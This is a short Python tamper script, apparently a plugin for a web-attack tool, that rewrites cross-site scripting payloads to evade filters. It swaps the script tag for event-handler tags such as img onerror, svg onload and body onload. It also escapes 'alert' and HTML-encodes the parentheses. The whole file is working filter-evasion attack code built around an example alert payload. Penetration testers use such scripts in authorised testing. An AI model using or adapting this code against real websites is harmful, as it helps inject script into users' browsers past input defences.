import random

__example_payload__ = "<script>alert(1)</script>"
__type__ = "XSS vector variation using mixed case, encoded chars, and alternative tags"


def tamper(payload, **kwargs):
    if payload:
        xss_variants = [
            ('<script>', '</script>'),
            ('<img src=x onerror=', '>'),
            ('<svg onload=', '>'),
            ('<body onload=', '>'),
        ]
        tag = random.choice(xss_variants)
        payload = payload.replace('<script>', tag[0])
        payload = payload.replace('</script>', tag[1])
        payload = payload.replace('alert', '\u0061lert')
        payload = payload.replace('(', '&#40;')
        payload = payload.replace(')', '&#41;')
        return payload
    return payload
